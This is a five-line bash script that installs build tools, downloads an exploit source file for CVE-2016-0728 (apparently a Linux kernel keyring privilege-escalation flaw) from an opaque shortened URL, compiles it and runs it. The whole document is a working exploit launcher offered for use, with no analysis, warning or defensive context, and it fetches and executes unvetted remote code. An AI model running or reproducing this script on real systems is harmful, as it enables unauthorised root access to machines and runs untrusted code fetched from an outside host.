#!/bin/bash
sudo apt-get install gcc libkeyutils-dev
wget -c goo.gl/PzFUPw -O cve_2016_0728.c
gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils
./cve_2016_0728 PP1
